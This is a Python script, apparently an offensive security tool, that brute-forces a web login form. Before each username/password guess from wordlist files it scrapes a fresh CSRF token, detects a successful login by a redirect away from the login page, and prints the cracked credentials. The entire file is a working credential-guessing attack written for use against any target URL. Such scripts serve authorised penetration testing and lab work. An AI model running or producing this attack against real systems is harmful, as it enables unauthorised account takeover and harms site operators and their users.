import argparse
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()


def get_csrf(session, url):
    r = session.get(url, timeout=10)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    return m.group(1) if m else None


def attempt(url, user, pw):
    session = requests.Session()
    csrf = get_csrf(session, url)
    if csrf is None:
        sys.exit("[!] csrf token not found")

    r = session.post(
        url,
        data={
            "username": user,
            "password": pw,
            "login_submit": "Log In",
            "csrf": csrf,
        },
        timeout=10,
        allow_redirects=True,
    )
    # 성공: 로그인 페이지 밖으로 리다이렉트 / 실패: 로그인 페이지에 머무름
    return r.url.rstrip("/") != url.rstrip("/")


def main():
    p = argparse.ArgumentParser(description="login brute force with CSRF")
    p.add_argument("-t", "--url", required=True, help="login form url")
    p.add_argument("-U", "--users", required=True, help="usernames file path")
    p.add_argument("-P", "--passwords", required=True, help="passwords file path")
    p.add_argument("--delay", type=float, default=0, help="delay between requests")
    p.add_argument("-v", "--verbose", action="store_true", help="verbose mode")
    args = p.parse_args()

    users = [l.strip() for l in open(args.users) if l.strip()]
    passwords = [l.strip() for l in open(args.passwords) if l.strip()]
    total_count = len(users) * len(passwords)
    print(f"[*] users={len(users)} passwords={len(passwords)} total={total_count}")

    count = 0
    for user in users:
        found = False
        for pw in passwords:
            if args.verbose:
                print(f"[-] {user}:{pw}")
            print(f"\r{count}/{total_count}", end="", flush=True)
            count += 1
            try:
                if attempt(args.url, user, pw):
                    print(f"\n[+] found: {user}:{pw}")
                    found = True
                    break
            except requests.RequestException as e:
                print(f"\n[!] {user}:{pw} error: {e}")
            if args.delay:
                time.sleep(args.delay)
        if not found:
            print(f"\n[-] {user}: not found")


if __name__ == "__main__":
    main()
